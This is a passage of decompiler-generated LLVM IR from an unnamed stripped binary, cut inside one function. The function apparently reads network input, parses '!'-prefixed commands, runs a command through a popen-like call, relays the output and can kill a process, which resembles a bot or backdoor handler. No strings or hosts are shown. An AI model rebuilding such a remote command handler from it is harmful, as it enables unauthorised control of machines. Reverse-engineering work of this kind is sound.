dec_label_pc_f828:                                ; preds = %dec_label_pc_f810
  %v1_f82c = call i32 @function_1422c(i32 0)
  store i32 %v1_f82c, i32* @r0, align 4
  br label %dec_label_pc_f830

dec_label_pc_f830:                                ; preds = %dec_label_pc_f804, %dec_label_pc_f810, %dec_label_pc_f828
  %v0_f830 = call i32 @function_107e4()
  %v1_f838 = call i32 @function_105dc(i32 ptrtoint (i32* @global_var_19f90.139 to i32))
  %v2_f844 = call i32 @function_12964(i32 13, i32 1)
  %v2_1022c = ptrtoint i32* %stack_var_-5260 to i32
  %v4_1023c = bitcast i32* %stack_var_-5260 to i8*
  %v7_fc08 = icmp eq i32 %arg1, 2
  %v1_fc38 = add i32 %tmp, 4
  %v1_fc3c = inttoptr i32 %v1_fc38 to i32*
  %v1_fe38 = or i32 %v2_1022c, 1
  %v2_ffa8 = ptrtoint i32* %stack_var_-1164 to i32
  %v2_ffb8 = bitcast i32* %stack_var_-1164 to i8*
  %v2_101ec = add i32 %v2_f65c, -108
  br label %dec_label_pc_f848

dec_label_pc_f848:                                ; preds = %dec_label_pc_f858, %dec_label_pc_1021c, %dec_label_pc_f830
  %v0_f848 = call i32 @function_f1f4()
  %v2_f850 = icmp eq i32 %v0_f848, 0
  br i1 %v2_f850, label %dec_label_pc_f874, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f848
  %v7_f864 = call i32 @function_10a58(i32 ptrtoint ([38 x i8]* @global_var_19f94.141 to i32), i32 ptrtoint (i32* @global_var_19f80.137 to i32), i32 ptrtoint (i32* @global_var_19f88.133 to i32), i32 %v0_f848, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_f86c = call i32 @function_142e4(i32 5)
  br label %dec_label_pc_f848

dec_label_pc_f874:                                ; preds = %dec_label_pc_f848
  %v2_f878 = load i32, i32* @global_var_23700.47, align 4
  store i32 %v2_f878, i32* @r4, align 4
  %v1_f87c = call i32 @function_8204(i32 0)
  store i32 %v1_f87c, i32* @r5, align 4
  %v0_f884 = call i32 @function_8250()
  store i32 %v0_f884, i32* @r6, align 4
  %v0_f88c = call i32 @function_8228()
  %v0_f898 = load i32, i32* @r4, align 4
  %v0_f8a0 = load i32, i32* @r5, align 4
  store i32 %v0_f8a0, i32* @r2, align 4
  %v3_f8a8 = call i32 @function_8f1c(i32 %v0_f898, i32 ptrtoint ([17 x i8]* @global_var_19fbc.144 to i32))
  br label %dec_label_pc_1021c

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_fb80, %dec_label_pc_fb24
  %v3_f8d0 = mul i32 %v3_fb74, 4
  %v2_f8dc = load i32, i32* @global_var_29778.54, align 4
  %v2_f8e0 = add i32 %v2_f8dc, %v3_f8d0
  %v1_f8e4 = inttoptr i32 %v2_f8e0 to i32*
  %v2_f8e4 = load i32, i32* %v1_f8e4, align 4
  store i32 %v2_f8e4, i32* @r0, align 4
  %v3_f8f4 = call i32 @function_10580(i32 %v2_f8e4, i32 0, i32 1)
  %tmp100 = icmp slt i32 %v3_f8f4, 1
  br i1 %tmp100, label %dec_label_pc_fb18, label %dec_label_pc_f958

dec_label_pc_f914:                                ; preds = %dec_label_pc_f9ac, %dec_label_pc_f958
  %v2_f918 = load i32, i32* @global_var_29778.54, align 4
  %v3_f924 = mul i32 %v1_f908, 4
  %v1_f91c = add i32 %v3_f924, -4
  %v2_f928 = add i32 %v1_f91c, %v2_f918
  %v2_f940 = add i32 %v2_f918, %v3_f924
  %v1_f944 = inttoptr i32 %v2_f940 to i32*
  %v2_f944 = load i32, i32* %v1_f944, align 4
  %v2_f948 = inttoptr i32 %v2_f928 to i32*
  store i32 %v2_f944, i32* %v2_f948, align 4
  br label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %dec_label_pc_f8cc, %dec_label_pc_f914
  %v3_f904.sink = phi i32 [ %v1_f908, %dec_label_pc_f914 ], [ %v3_fb74, %dec_label_pc_f8cc ]
  %v1_f908 = add i32 %v3_f904.sink, 1
  %v2_f970 = load i32, i32* @global_var_23708.51, align 4
  %v5_f970 = load i32, i32* @global_var_2370c.52, align 4
  %tmp101 = icmp ugt i32 %v5_f970, %v1_f908
  br i1 %tmp101, label %dec_label_pc_f914, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %dec_label_pc_f958
  %v9_f9a4 = icmp eq i32 %v5_f970, %v1_f908
  br i1 %v9_f9a4, label %dec_label_pc_f9ac, label %dec_label_pc_f9c4

dec_label_pc_f9ac:                                ; preds = %dec_label_pc_f994
  %v9_f9bc = icmp eq i32 %v2_f970, 0
  br i1 %v9_f9bc, label %dec_label_pc_f9c4, label %dec_label_pc_f914

dec_label_pc_f9c4:                                ; preds = %dec_label_pc_f9ac, %dec_label_pc_f994
  %v2_f9c8 = load i32, i32* @global_var_29778.54, align 4
  %v3_f9d4 = mul i32 %v1_f908, 4
  %v1_f9cc = add i32 %v3_f9d4, -4
  %v2_f9d8 = add i32 %v1_f9cc, %v2_f9c8
  %v2_f9e0 = inttoptr i32 %v2_f9d8 to i32*
  store i32 0, i32* %v2_f9e0, align 4
  %v2_f9e8 = load i32, i32* @global_var_23708.51, align 4
  %v5_f9e8 = load i32, i32* @global_var_2370c.52, align 4
  %v2_f9f4 = add i32 %v2_f9e8, -1
  %v3_f9f4 = icmp ne i32 %v2_f9e8, 0
  %v3_f9f8 = add i32 %v5_f9e8, -1
  %v4_f9f8 = zext i1 %v3_f9f4 to i32
  %v5_f9f8 = add i32 %v3_f9f8, %v4_f9f8
  store i32 %v2_f9f4, i32* @global_var_23708.51, align 4
  store i32 %v5_f9f8, i32* @global_var_2370c.52, align 4
  %v3_fa14 = icmp eq i32 %v2_f9e8, 0
  %v4_fa18 = zext i1 %v3_fa14 to i32
  %v5_fa18 = add i32 %v5_f9f8, %v4_fa18
  %v3_fa1c = udiv i32 %v2_f9e8, 1073741824
  %v3_fa20 = mul i32 %v5_fa18, 4
  %v2_fa24 = or i32 %v3_fa20, %v3_fa1c
  store i32 %v2_fa24, i32* @r4, align 4
  %v3_fa28 = mul i32 %v2_f9e8, 4
  %v1_fa30 = call i32 @function_12b00(i32 %v3_fa28)
  br label %dec_label_pc_fa88

dec_label_pc_fa48:                                ; preds = %dec_label_pc_fae4, %dec_label_pc_fa88
  %v3_fa4c = mul i32 %v3_fad8, 4
  %v2_fa58 = add i32 %v3_fa4c, %v1_fa30
  %v2_fa6c = load i32, i32* @global_var_29778.54, align 4
  %v2_fa70 = add i32 %v2_fa6c, %v3_fa4c
  %v1_fa74 = inttoptr i32 %v2_fa70 to i32*
  %v2_fa74 = load i32, i32* %v1_fa74, align 4
  %v2_fa78 = inttoptr i32 %v2_fa58 to i32*
  store i32 %v2_fa74, i32* %v2_fa78, align 4
  %v1_fa80 = add i32 %v3_fad8, 1
  br label %dec_label_pc_fa88

dec_label_pc_fa88:                                ; preds = %dec_label_pc_f9c4, %dec_label_pc_fa48
  %v3_fad8 = phi i32 [ 0, %dec_label_pc_f9c4 ], [ %v1_fa80, %dec_label_pc_fa48 ]
  %v2_faa4 = load i32, i32* @global_var_23708.51, align 4
  %v5_faa4 = load i32, i32* @global_var_2370c.52, align 4
  %tmp103 = icmp ugt i32 %v5_faa4, %v3_fad8
  br i1 %tmp103, label %dec_label_pc_fa48, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_fa88
  %v9_fadc = icmp eq i32 %v5_faa4, %v3_fad8
  br i1 %v9_fadc, label %dec_label_pc_fae4, label %dec_label_pc_fafc

dec_label_pc_fae4:                                ; preds = %dec_label_pc_facc
  %v9_faf4 = icmp eq i32 %v2_faa4, 0
  br i1 %v9_faf4, label %dec_label_pc_fafc, label %dec_label_pc_fa48

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fae4, %dec_label_pc_facc
  %v2_fb00 = load i32, i32* @global_var_29778.54, align 4
  store i32 %v2_fb00, i32* @r0, align 4
  %v0_fb08 = call i32 @function_13684()
  store i32 %v1_fa30, i32* @global_var_29778.54, align 4
  br label %dec_label_pc_fb18

dec_label_pc_fb18:                                ; preds = %dec_label_pc_f8cc, %dec_label_pc_fafc
  %v1_fb1c = add i32 %v3_fb74, 1
  br label %dec_label_pc_fb24

dec_label_pc_fb24:                                ; preds = %dec_label_pc_1021c, %dec_label_pc_fb18
  %v3_fb74 = phi i32 [ %v1_fb1c, %dec_label_pc_fb18 ], [ 0, %dec_label_pc_1021c ]
  %v3_fb2c = ashr i32 %v3_fb74, 31
  %v2_fb40 = load i32, i32* @global_var_23708.51, align 4
  %v5_fb40 = load i32, i32* @global_var_2370c.52, align 4
  %v3_fb60 = icmp uge i32 %v5_fb40, %v3_fb74
  %v9_fb60 = icmp eq i32 %v5_fb40, %v3_fb74
  %v2_fb64 = xor i1 %v9_fb60, true
  %v3_fb64 = and i1 %v3_fb60, %v2_fb64
  br i1 %v3_fb64, label %dec_label_pc_f8cc, label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb24
  br i1 %v9_fb60, label %dec_label_pc_fb80, label %dec_label_pc_fb98

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb68
  %tmp116 = icmp ugt i32 %v2_fb40, %v3_fb2c
  br i1 %tmp116, label %dec_label_pc_f8cc, label %dec_label_pc_fb98

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb68, %dec_label_pc_fb80
  %v2_fbac = add i32 %v5_1023c, %v2_1022c
  %v3_fbb4 = inttoptr i32 %v2_fbac to i8*
  store i8 0, i8* %v3_fbb4, align 1
  %v1_fbc8 = call i32 @function_8584(i32 %v2_1022c)
  %v2_fbdc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19fd0.148 to i32), i32* @r1, align 4
  %v3_fbe8 = inttoptr i32 %v2_fbdc to i8*
  %v4_fbe8 = call i32 @function_12030(i8* %v3_fbe8, i32 ptrtoint ([8 x i8]* @global_var_19fd0.148 to i32))
  %v2_fbf0 = icmp eq i32 %v4_fbe8, 0
  br i1 %v2_fbf0, label %dec_label_pc_fbf8, label %dec_label_pc_fd3c

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fb98
  store i32 %v2_f65c, i32* @r2, align 4
  br i1 %v7_fc08, label %dec_label_pc_fc28, label %dec_label_pc_fc10

dec_label_pc_fc10:                                ; preds = %dec_label_pc_fbf8
  %v2_fc14 = load i32, i32* @global_var_23700.47, align 4
  %v3_fc20 = call i32 @function_8f1c(i32 %v2_fc14, i32 ptrtoint ([17 x i8]* @global_var_19fd8.150 to i32))
  br label %dec_label_pc_10258

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fbf8
  %v2_fc3c = load i32, i32* %v1_fc3c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19fec.152 to i32), i32* @r1, align 4
  %v3_fc48 = inttoptr i32 %v2_fc3c to i8*
  %v4_fc48 = call i32 @function_12030(i8* %v3_fc48, i32 ptrtoint ([4 x i8]* @global_var_19fec.152 to i32))
  %v2_fc50 = icmp eq i32 %v4_fc48, 0
  br i1 %v2_fc50, label %dec_label_pc_fc58, label %dec_label_pc_fc9c

dec_label_pc_fc58:                                ; preds = %dec_label_pc_fc28
  %v2_fc5c = load i32, i32* @global_var_29774.154, align 4
  %v2_fc60 = icmp eq i32 %v2_fc5c, 0
  br i1 %v2_fc60, label %dec_label_pc_10258, label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fc58
  %v2_fc6c = load i32, i32* @global_var_23700.47, align 4
  %v3_fc78 = call i32 @function_8f1c(i32 %v2_fc6c, i32 ptrtoint ([17 x i8]* @global_var_19ff0.156 to i32))
  %v2_fc80 = load i32, i32* @global_var_29774.154, align 4
  %v2_fc8c = call i32 @function_10670(i32 %v2_fc80, i32 9)
  store i32 0, i32* @global_var_29774.154, align 4
  br label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc28, %dec_label_pc_fc68
  %v2_fcb0 = load i32, i32* %v1_fc3c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a004.158 to i32), i32* @r1, align 4
  %v3_fcbc = inttoptr i32 %v2_fcb0 to i8*
  %v4_fcbc = call i32 @function_12030(i8* %v3_fcbc, i32 ptrtoint ([3 x i8]* @global_var_1a004.158 to i32))
  store i32 %v4_fcbc, i32* @r0, align 4
  %v2_fcc4 = icmp eq i32 %v4_fcbc, 0
  br i1 %v2_fcc4, label %dec_label_pc_fccc, label %dec_label_pc_fd3c

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fc9c
  %v2_fcd0 = load i32, i32* @global_var_29774.154, align 4
  %v2_fcd4 = icmp eq i32 %v2_fcd0, 0
  br i1 %v2_fcd4, label %dec_label_pc_fcdc, label %dec_label_pc_10258

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fccc
  %v0_fcdc = call i32 @function_1054c()
  %v2_fcec = call i32 @function_10978(i32 ptrtoint ([28 x i8]* @global_var_1a008.160 to i32))
  %v2_fcf4 = load i32, i32* @global_var_23700.47, align 4
  %v3_fd00 = call i32 @function_8f1c(i32 %v2_fcf4, i32 ptrtoint ([17 x i8]* @global_var_1a024.162 to i32))
  %v2_fd08 = icmp eq i32 %v0_fcdc, 0
  br i1 %v2_fd08, label %dec_label_pc_fd2c, label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fcdc
  store i32 %v0_fcdc, i32* @global_var_29774.154, align 4
  br label %dec_label_pc_10258

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fcdc
  %v1_fd30 = call i32 @function_b09c(i32 1)
  %v1_fd38 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_fd3c

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fc9c, %dec_label_pc_fb98, %dec_label_pc_fd2c
  %v4_fd50 = call i32 @function_12060(i32 %v2_1022c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19e64.49, i32 0, i32 0))
  store i32 %v4_fd50, i32* @r2, align 4
  %v9_fd64 = icmp eq i32 %v4_fd50, %v2_1022c
  br i1 %v9_fd64, label %dec_label_pc_fd6c, label %dec_label_pc_fd84

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd3c
  %v2_fd70 = load i32, i32* @global_var_23700.47, align 4
  %v3_fd7c = call i32 @function_8f1c(i32 %v2_fd70, i32 ptrtoint ([5 x i8]* @global_var_1a038.165 to i32))
  br label %dec_label_pc_1021c

dec_label_pc_fd84:                                ; preds = %dec_label_pc_fd3c
  %v4_fd98 = call i32 @function_12060(i32 %v2_1022c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a040.167, i32 0, i32 0))
  %v9_fdac = icmp eq i32 %v4_fd98, %v2_1022c
  br i1 %v9_fdac, label %dec_label_pc_fdb4, label %dec_label_pc_fdbc

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fd84
  %v1_fdb8 = call i32 @function_1422c(i32 0)
  br label %dec_label_pc_fdbc

dec_label_pc_fdbc:                                ; preds = %dec_label_pc_fd84, %dec_label_pc_fdb4
  %v2_fdd0 = load i8, i8* %v4_1023c, align 4
  %v7_fdd4 = icmp eq i8 %v2_fdd0, 33
  br i1 %v7_fdd4, label %dec_label_pc_fdf8, label %dec_label_pc_1021c

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fdbc, %dec_label_pc_fe08
  %v3_fddc.sink = phi i8* [ %storemerge6, %dec_label_pc_fe08 ], [ %v4_1023c, %dec_label_pc_fdbc ]
  %v4_fddc = ptrtoint i8* %v3_fddc.sink to i32
  %v1_fde0 = add i32 %v4_fddc, 1
  %storemerge6 = inttoptr i32 %v1_fde0 to i8*
  %v2_fdfc = load i8, i8* %storemerge6, align 1
  %v7_fe00 = icmp eq i8 %v2_fdfc, 32
  br i1 %v7_fe00, label %dec_label_pc_fe18, label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdf8
  %v2_fe0c = load i8, i8* %storemerge6, align 1
  %v2_fe10 = icmp eq i8 %v2_fe0c, 0
  br i1 %v2_fe10, label %dec_label_pc_fe18, label %dec_label_pc_fdf8

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe08, %dec_label_pc_fdf8
  %v2_fe1c = load i8, i8* %storemerge6, align 1
  %v2_fe20 = icmp eq i8 %v2_fe1c, 0
  br i1 %v2_fe20, label %dec_label_pc_1021c, label %dec_label_pc_fe28

dec_label_pc_fe28:                                ; preds = %dec_label_pc_fe18
  store i8 0, i8* %storemerge6, align 1
  store i32 %v1_fe38, i32* @r0, align 4
  %v0_fe48 = call i32 @function_11fd0()
  %v2_fe58 = add i32 %v0_fe48, %v2_1022c
  %v1_fe5c = add i32 %v2_fe58, 2
  %v1_fe90 = add i32 %v2_fe58, 1
  br label %dec_label_pc_fe8c

dec_label_pc_fe68:                                ; preds = %dec_label_pc_feb4, %dec_label_pc_fe8c
  store i32 %v1_fe5c, i32* @r0, align 4
  %v0_fe78 = call i32 @function_11fd0()
  %v2_fe80 = add i32 %v1_fe90, %v0_fe78
  %v3_fe88 = inttoptr i32 %v2_fe80 to i8*
  store i8 0, i8* %v3_fe88, align 1
  br label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe28, %dec_label_pc_fe68
  store i32 %v1_fe5c, i32* @r0, align 4
  %v0_fe9c = call i32 @function_11fd0()
  %v2_fea4 = add i32 %v1_fe90, %v0_fe9c
  %v1_fea8 = inttoptr i32 %v2_fea4 to i8*
  %v2_fea8 = load i8, i8* %v1_fea8, align 1
  %v7_feac = icmp eq i8 %v2_fea8, 10
  br i1 %v7_feac, label %dec_label_pc_fe68, label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fe8c
  store i32 %v1_fe90, i32* @r4, align 4
  store i32 %v1_fe5c, i32* @r0, align 4
  %v0_fec4 = call i32 @function_11fd0()
  %v0_fecc = load i32, i32* @r4, align 4
  %v2_fecc = add i32 %v0_fecc, %v0_fec4
  %v1_fed0 = inttoptr i32 %v2_fecc to i8*
  %v2_fed0 = load i8, i8* %v1_fed0, align 1
  %v7_fed4 = icmp eq i8 %v2_fed0, 13
  br i1 %v7_fed4, label %dec_label_pc_fe68, label %dec_label_pc_fef4.preheader

dec_label_pc_fef4.preheader:                      ; preds = %dec_label_pc_feb4
  %stack_var_-76.018 = inttoptr i32 %v1_fe5c to i8*
  %v2_fef819 = load i8, i8* %stack_var_-76.018, align 1
  %v7_fefc23 = icmp eq i8 %v2_fef819, 32
  br i1 %v7_fefc23, label %dec_label_pc_ff14, label %dec_label_pc_ff04

dec_label_pc_fee8:                                ; preds = %dec_label_pc_ff04
  %v1_feec = add i32 %stack_var_-76.0.in24, 1
  %stack_var_-76.0 = inttoptr i32 %v1_feec to i8*
  %v2_fef8 = load i8, i8* %stack_var_-76.0, align 1
  %v7_fefc = icmp eq i8 %v2_fef8, 32
  br i1 %v7_fefc, label %dec_label_pc_ff14, label %dec_label_pc_ff04

dec_label_pc_ff04:                                ; preds = %dec_label_pc_fef4.preheader, %dec_label_pc_fee8
  %stack_var_-76.025 = phi i8* [ %stack_var_-76.0, %dec_label_pc_fee8 ], [ %stack_var_-76.018, %dec_label_pc_fef4.preheader ]
  %stack_var_-76.0.in24 = phi i32 [ %v1_feec, %dec_label_pc_fee8 ], [ %v1_fe5c, %dec_label_pc_fef4.preheader ]
  %v2_ff08 = load i8, i8* %stack_var_-76.025, align 1
  %v2_ff0c = icmp eq i8 %v2_ff08, 0
  br i1 %v2_ff0c, label %dec_label_pc_ff14, label %dec_label_pc_fee8

dec_label_pc_ff14:                                ; preds = %dec_label_pc_fee8, %dec_label_pc_ff04, %dec_label_pc_fef4.preheader
  %stack_var_-76.0.in.lcssa = phi i32 [ %v1_fe5c, %dec_label_pc_fef4.preheader ], [ %v1_feec, %dec_label_pc_fee8 ], [ %stack_var_-76.0.in24, %dec_label_pc_ff04 ]
  %stack_var_-76.0.lcssa = phi i8* [ %stack_var_-76.018, %dec_label_pc_fef4.preheader ], [ %stack_var_-76.0, %dec_label_pc_fee8 ], [ %stack_var_-76.025, %dec_label_pc_ff04 ]
  store i8 0, i8* %stack_var_-76.0.lcssa, align 1
  %v1_ff24 = add i32 %stack_var_-76.0.in.lcssa, 1
  %v2_ff6830 = load i8, i8* %stack_var_-76.018, align 1
  %v2_ff6c32 = icmp eq i8 %v2_ff6830, 0
  br i1 %v2_ff6c32, label %dec_label_pc_ff74, label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %dec_label_pc_ff14, %dec_label_pc_ff38
  %storemerge534 = phi i8* [ %storemerge5, %dec_label_pc_ff38 ], [ %stack_var_-76.018, %dec_label_pc_ff14 ]
  %storemerge1433 = phi i32 [ %v1_ff5c, %dec_label_pc_ff38 ], [ %v1_fe5c, %dec_label_pc_ff14 ]
  %v2_ff3c = load i8, i8* %storemerge534, align 1
  %v3_ff3c = zext i8 %v2_ff3c to i32
  %v1_ff44 = call i32 @function_1092c(i32 %v3_ff3c)
  %v1_ff54 = trunc i32 %v1_ff44 to i8
  store i8 %v1_ff54, i8* %storemerge534, align 1
  %v1_ff5c = add i32 %storemerge1433, 1
  %storemerge5 = inttoptr i32 %v1_ff5c to i8*
  %v2_ff68 = load i8, i8* %storemerge5, align 1
  %v2_ff6c = icmp eq i8 %v2_ff68, 0
  br i1 %v2_ff6c, label %dec_label_pc_ff74, label %dec_label_pc_ff38

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff38, %dec_label_pc_ff14
  store i32 ptrtoint ([3 x i8]* @global_var_1a044.169 to i32), i32* @r1, align 4
  %v4_ff80 = call i32 @function_12030(i8* %stack_var_-76.018, i32 ptrtoint ([3 x i8]* @global_var_1a044.169 to i32))
  store i32 %v4_ff80, i32* @r0, align 4
  %v2_ff88 = icmp eq i32 %v4_ff80, 0
  br i1 %v2_ff88, label %dec_label_pc_ff90, label %dec_label_pc_10098

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff74
  %v0_ff90 = call i32 @function_a104()
  %v2_ff98 = icmp eq i32 %v0_ff90, 0
  br i1 %v2_ff98, label %dec_label_pc_ffa0, label %dec_label_pc_1021c

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_ff90
  store i32 1024, i32* @r2, align 4
  %v3_ffb8 = call i32 @function_11f30(i8* %v2_ffb8, i32 0)
  %v5_ffd8 = call i32 @function_8ed4(i32 %v2_ffa8, i32 ptrtoint ([8 x i8]* @global_var_1a048.171 to i32), i32 %v1_ff24, i32 %v2_ffa8)
  %v3_fff4 = call i32 @function_8fe8(i32 %v2_ffa8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1a050.173, i32 0, i32 0))
  br label %dec_label_pc_10060

dec_label_pc_10004:                               ; preds = %dec_label_pc_10060
  %v1_10014 = call i32 @function_8584(i32 %v2_ffa8)
  %v2_1001c = load i32, i32* @global_var_23700.47, align 4
  store i32 %v2_ffa8, i32* @r2, align 4
  %v3_10038 = call i32 @function_8f1c(i32 %v2_1001c, i32 ptrtoint ([3 x i8]* @global_var_1a054.175 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_10054 = call i32 @function_11f30(i8* %v2_ffb8, i32 0)
  %v1_1005c = call i32 @function_142e4(i32 1)
  br label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %dec_label_pc_ffa0, %dec_label_pc_10004
  %v4_10078 = call i32 @function_93f8(i32 %v2_ffa8, i32 1024, i32 %v3_fff4, i32 %v2_ffa8)
  %v2_10080 = icmp eq i32 %v4_10078, 0
  br i1 %v2_10080, label %dec_label_pc_10088, label %dec_label_pc_10004

dec_label_pc_10088:                               ; preds = %dec_label_pc_10060
  %v1_1008c = call i32 @function_9270(i32 %v3_fff4)
  %v1_10094 = call i32 @function_1422c(i32 0)
  br label %dec_label_pc_10098

dec_label_pc_10098:                               ; preds = %dec_label_pc_ff74, %dec_label_pc_10088
  store i32 ptrtoint (i32* @global_var_1a058.177 to i32), i32* @r1, align 4
  %v2_100ac = call i32 @function_12410(i32 %v1_ff24, i32 ptrtoint (i32* @global_var_1a058.177 to i32))
  store i32 %v1_fe5c, i32* %stack_var_-140, align 4
  %v2_101a436 = icmp eq i32 %v2_100ac, 0
  br i1 %v2_101a436, label %dec_label_pc_101ac, label %dec_label_pc_100c4

dec_label_pc_100c4:                               ; preds = %dec_label_pc_10098, %dec_label_pc_1018c
  %stack_var_-44.0.in38 = phi i32 [ %v2_10194, %dec_label_pc_1018c ], [ %v2_100ac, %dec_label_pc_10098 ]
  %stack_var_-48.137 = phi i32 [ %stack_var_-48.0, %dec_label_pc_1018c ], [ 1, %dec_label_pc_10098 ]
  %stack_var_-44.0 = inttoptr i32 %stack_var_-44.0.in38 to i8*
  %v2_100c8 = load i8, i8* %stack_var_-44.0, align 1
  %v7_100cc = icmp eq i8 %v2_100c8, 10
  br i1 %v7_100cc, label %dec_label_pc_1018c, label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100c4
  store i32 %stack_var_-48.137, i32* @r4, align 4
  store i32 %stack_var_-44.0.in38, i32* @r0, align 4
  %v0_100e0 = call i32 @function_11fd0()
  %v1_100e8 = add i32 %v0_100e0, 1
  %v1_100f0 = call i32 @function_12b00(i32 %v1_100e8)
  %v0_10100 = load i32, i32* @r4, align 4
  %v3_10100 = mul i32 %v0_10100, 4
  %v2_1010c = add i32 %v2_101ec, %v3_10100
  %v2_10110 = inttoptr i32 %v2_1010c to i32*
  store i32 %v1_100f0, i32* %v2_10110, align 4
  %v3_1011c = mul i32 %stack_var_-48.137, 4
  %v2_10128 = add i32 %v2_101ec, %v3_1011c
  %v1_1012c = inttoptr i32 %v2_10128 to i32*
  %v2_1012c = load i32, i32* %v1_1012c, align 4
  store i32 %v2_1012c, i32* @r4, align 4
  store i32 %stack_var_-44.0.in38, i32* @r0, align 4
  %v0_10138 = call i32 @function_11fd0()
  %v1_10140 = add i32 %v0_10138, 1
  %v0_10144 = load i32, i32* @r4, align 4
  store i32 %v1_10140, i32* @r2, align 4
  %v2_10150 = inttoptr i32 %v0_10144 to i8*
  %v3_10150 = call i32 @function_11f30(i8* %v2_10150, i32 0)
  %v2_1016c = load i32, i32* %v1_1012c, align 4
  store i32 %stack_var_-44.0.in38, i32* @r1, align 4
  %v3_1017c = inttoptr i32 %v2_1016c to i8*
  %v4_1017c = call i32 @function_12228(i8* %v3_1017c, i32 %stack_var_-44.0.in38)
  %v1_10184 = add i32 %stack_var_-48.137, 1
  br label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_100c4, %dec_label_pc_100d4
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.137, %dec_label_pc_100c4 ], [ %v1_10184, %dec_label_pc_100d4 ]
  store i32 ptrtoint (i32* @global_var_1a058.177 to i32), i32* @r1, align 4
  %v2_10194 = call i32 @function_12410(i32 0, i32 ptrtoint (i32* @global_var_1a058.177 to i32))
  %v2_101a4 = icmp eq i32 %v2_10194, 0
  br i1 %v2_101a4, label %dec_label_pc_101ac, label %dec_label_pc_100c4

dec_label_pc_101ac:                               ; preds = %dec_label_pc_1018c, %dec_label_pc_10098
  %stack_var_-48.1.lcssa = phi i32 [ 1, %dec_label_pc_10098 ], [ %stack_var_-48.0, %dec_label_pc_1018c ]
  %v3_101b8 = call i32 @function_e708(i32 %stack_var_-48.1.lcssa, i32* nonnull %stack_var_-140)
  %v7_101c4 = icmp slt i32 %stack_var_-48.1.lcssa, 2
  br i1 %v7_101c4, label %dec_label_pc_1021c, label %dec_label_pc_101dc.lr.ph

dec_label_pc_101dc.lr.ph:                         ; preds = %dec_label_pc_101ac
  br label %dec_label_pc_101dc

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101dc.lr.ph, %dec_label_pc_101dc
  %storemerge15115 = phi i32 [ 1, %dec_label_pc_101dc.lr.ph ], [ %v1_10204, %dec_label_pc_101dc ]
  %v3_101e4 = mul i32 %storemerge15115, 4
  %v2_101f0 = add i32 %v2_101ec, %v3_101e4
  %v1_101f4 = inttoptr i32 %v2_101f0 to i32*
  %v2_101f4 = load i32, i32* %v1_101f4, align 4
  store i32 %v2_101f4, i32* @r0, align 4
  %v0_101fc = call i32 @function_13684()
  %v1_10204 = add nuw nsw i32 %storemerge15115, 1
  %v5_10218 = icmp slt i32 %v1_10204, %stack_var_-48.1.lcssa
  br i1 %v5_10218, label %dec_label_pc_101dc, label %dec_label_pc_1021c

dec_label_pc_1021c:                               ; preds = %dec_label_pc_101dc, %dec_label_pc_ff90, %dec_label_pc_fdbc, %dec_label_pc_101ac, %dec_label_pc_fe18, %dec_label_pc_fd6c, %dec_label_pc_f874
  %v2_10220 = load i32, i32* @global_var_23700.47, align 4
  %v5_1023c = call i32 @function_9ba0(i32 %v2_10220, i8* %v4_1023c, i32 4096, i32 %v2_1022c)
  %v3_1024c = icmp eq i32 %v5_1023c, -1
  br i1 %v3_1024c, label %dec_label_pc_f848, label %dec_label_pc_fb24

dec_label_pc_10258:                               ; preds = %dec_label_pc_fccc, %dec_label_pc_fc58, %dec_label_pc_fd10, %dec_label_pc_fc10
  %v1_10260 = phi i32 [ %v3_fd00, %dec_label_pc_fd10 ], [ %v3_fc20, %dec_label_pc_fc10 ], [ 0, %dec_label_pc_fc58 ], [ 0, %dec_label_pc_fccc ]
  ret i32 %v1_10260

; uselistorder directives
  uselistorder i32 %v5_1023c, { 1, 0 }
  uselistorder i32 %stack_var_-48.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_10194, { 1, 0 }
  uselistorder i32 %stack_var_-48.137, { 1, 3, 0, 2 }
